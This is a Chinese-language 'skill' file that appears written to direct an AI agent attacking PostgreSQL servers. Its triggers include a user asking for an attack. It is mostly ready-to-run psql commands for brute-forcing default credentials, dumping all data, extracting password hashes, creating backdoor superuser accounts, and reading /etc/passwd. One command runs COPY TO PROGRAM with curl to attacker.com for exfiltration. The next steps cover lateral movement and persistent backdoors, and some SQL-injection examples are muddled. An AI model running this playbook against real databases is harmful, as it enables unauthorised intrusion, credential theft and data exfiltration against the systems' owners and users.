---
name: postgresql-attack
type: attack
category: database
platform: postgresql
severity: high
---

# PostgreSQL 攻击技能

## 触发条件

- 发现 PostgreSQL 实例
- 有数据库凭证或未授权访问
- 用户要求"攻击 PostgreSQL"

## 前置检查

```bash
# 1. 测试连接
psql -h postgres.example.com -U postgres -c "SELECT version();"

# 2. 列出所有数据库
psql -h postgres.example.com -U postgres -c "\l"

# 3. 列出所有表
psql -h postgres.example.com -U postgres -d DATABASE_NAME -c "\dt"
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 测试默认凭证
# 常见默认: postgres/postgres, admin/admin, db/db
for user in "postgres" "admin" "root"; do
  for pass in "postgres" "admin" "password" "123456"; do
    PGPASSWORD=$pass psql -h postgres.example.com -U $user -c "SELECT 1;"
  done
done

# 2. 测试本地信任认证
psql -h postgres.example.com -U postgres -c "SELECT 1;"
# 如果配置了 trust，可以无密码登录

# 3. 扫描 PostgreSQL 服务
nmap -p 5432 --script postgres-brute TARGET_IP
```

### 方法 2: 数据库枚举

```bash
# 1. 列出所有数据库
psql -h postgres.example.com -U postgres -c "\l"

# 2. 列出所有表
psql -h postgres.example.com -U postgres -d DATABASE_NAME -c "\dt"

# 3. 列出所有 Schema
psql -h postgres.example.com -U postgres -d DATABASE_NAME -c "\dn"

# 4. 列出所有角色
psql -h postgres.example.com -U postgres -c "\du"
```

### 方法 3: 数据窃取

```bash
# 1. 读取表数据
psql -h postgres.example.com -U postgres -d DATABASE_NAME -c "SELECT * FROM table_name;"

# 2. 搜索敏感表
psql -h postgres.example.com -U postgres -d DATABASE_NAME -c \
  "SELECT tablename FROM pg_tables WHERE tablename LIKE '%password%' OR tablename LIKE '%secret%';"

# 3. 搜索敏感列
psql -h postgres.example.com -U postgres -d DATABASE_NAME -c \
  "SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%password%';"

# 4. 导出所有数据
pg_dump -h postgres.example.com -U postgres DATABASE_NAME > /tmp/postgres-dump.sql
```

### 方法 4: 用户凭证窃取

```bash
# 1. 列出所有用户
psql -h postgres.example.com -U postgres -c "\du"

# 2. 获取用户密码哈希
psql -h postgres.example.com -U postgres -c \
  "SELECT rolname, rolpassword FROM pg_authid;"

# 3. 创建新用户
psql -h postgres.example.com -U postgres -c \
  "CREATE USER attacker WITH PASSWORD 'password123';"

# 4. 授予管理员权限
psql -h postgres.example.com -U postgres -c \
  "GRANT ALL PRIVILEGES ON DATABASE DATABASE_NAME TO attacker;"
psql -h postgres.example.com -U postgres -c \
  "GRANT ALL PRIVILEGES ON SCHEMA public TO attacker;"
psql -h postgres.example.com -U postgres -c \
  "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO attacker;"
```

### 方法 5: SQL 注入

```bash
# 1. Blind SQLi
# 时间盲注
psql -h postgres.example.com -U postgres -c \
  "SELECT pg_sleep(10);"

# 2. Boolean 盲注
psql -h postgres.example.com -U postgres -c \
  "SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE false END;"

# 3. Union 注入
psql -h postgres.example.com -U postgres -d DATABASE_NAME -c \
  "SELECT username, password FROM users WHERE id=1 UNION SELECT NULL, NULL;"

# 4. Error 注入
psql -h postgres.example.com -U postgres -d DATABASE_NAME -c \
  "SELECT CAST(1/0 AS TEXT);"
```

### 方法 6: 文件读取（PostgreSQL 8.1+）

```bash
# 1. 读取文件（如果允许）
psql -h postgres.example.com -U postgres -c \
  "SELECT pg_read_file('/etc/passwd');"

# 2. 读取配置文件
psql -h postgres.example.com -U postgres -c \
  "SELECT pg_read_file('/etc/postgresql/postgresql.conf');"

# 3. 读取日志文件
psql -h postgres.example.com -U postgres -c \
  "SELECT pg_read_file('/var/log/postgresql/postgresql.log');"

# 4. 列出目录（使用 COPY）
psql -h postgres.example.com -U postgres -c \
  "COPY (SELECT * FROM pg_tables) TO '/tmp/tables.csv' WITH CSV HEADER;"
```

### 方法 7: 命令执行（PostgreSQL 8.1+）

```bash
# 1. 如果可以加载扩展
psql -h postgres.example.com -U postgres -c \
  "CREATE EXTENSION IF NOT EXISTS dblink;"

# 2. 使用 dblink 执行命令
psql -h postgres.example.com -U postgres -c \
  "SELECT dblink_connect('host=attacker.com user=attacker password=pass');"

# 3. 使用 UDF 执行命令
# 需要先上传恶意 .so 文件

# 4. 或通过 COPY TO PROGRAM
psql -h postgres.example.com -U postgres -c \
  "COPY (SELECT 'malicious') TO PROGRAM 'curl https://attacker.com/exfil';"
```

### 方法 8: 权限提升

```bash
# 1. 创建超级用户（如果有 CREATEROLE 权限）
psql -h postgres.example.com -U postgres -c \
  "CREATE ROLE admin WITH SUPERUSER LOGIN PASSWORD 'password123';"

# 2. 修改用户为超级用户
psql -h postgres.example.com -U postgres -c \
  "ALTER USER attacker WITH SUPERUSER;"

# 3. 继承权限
psql -h postgres.example.com -U postgres -c \
  "GRANT postgres TO attacker;"

# 4. 重置密码
psql -h postgres.example.com -U postgres -c \
  "ALTER USER postgres WITH PASSWORD 'newpassword';"
```

### 方法 9: 大对象利用

```bash
# 1. 列出所有大对象
psql -h postgres.example.com -U postgres -d DATABASE_NAME -c \
  "SELECT DISTINCT loid FROM pg_largeobject;"

# 2. 导出大对象
psql -h postgres.example.com -U postgres -d DATABASE_NAME -c \
  "SELECT lo_export(loid, '/tmp/object') FROM pg_largeobject WHERE loid = OBJECT_ID;"

# 3. 导入恶意大对象
psql -h postgres.example.com -U postgres -d DATABASE_NAME -c \
  "SELECT lo_import('/tmp/malicious');"

# 4. 删除大对象
psql -h postgres.example.com -U postgres -d DATABASE_NAME -c \
  "SELECT lo_unlink(OBJECT_ID);"
```

### 方法 10: 扩展和插件利用

```bash
# 1. 列出已安装的扩展
psql -h postgres.example.com -U postgres -c \
  "SELECT * FROM pg_extension;"

# 2. 安装恶意扩展（如果有权限）
psql -h postgres.example.com -U postgres -c \
  "CREATE EXTENSION IF NOT EXISTS file_fdw;"

# 3. 使用 file_fdw 读取文件
psql -h postgres.example.com -U postgres -c \
  "CREATE SERVER file_server FOREIGN DATA WRAPPER file_fdw;"
psql -h postgres.example.com -U postgres -c \
  "CREATE FOREIGN TABLE passwd (line text) SERVER file_server OPTIONS (filename '/etc/passwd');"
psql -h postgres.example.com -U postgres -c \
  "SELECT * FROM passwd;"

# 4. 利用其他扩展
# - pgcrypto: 加密函数
# - plpython: Python 执行
# - plperl: Perl 执行
```

## 验证成功

```bash
# 成功连接
psql -h postgres.example.com -U postgres -c "SELECT version();"

# 成功列出数据库
psql -h postgres.example.com -U postgres -c "\l"

# 成功读取数据
psql -h postgres.example.com -U postgres -d DATABASE_NAME -c "SELECT * FROM table_name;"
```

## 下一步

1. 分析窃取的数据中的敏感信息
2. 使用数据库凭证访问其他系统
3. 通过 PostgreSQL 建立持久化后门
4. 攻击使用 PostgreSQL 的应用程序
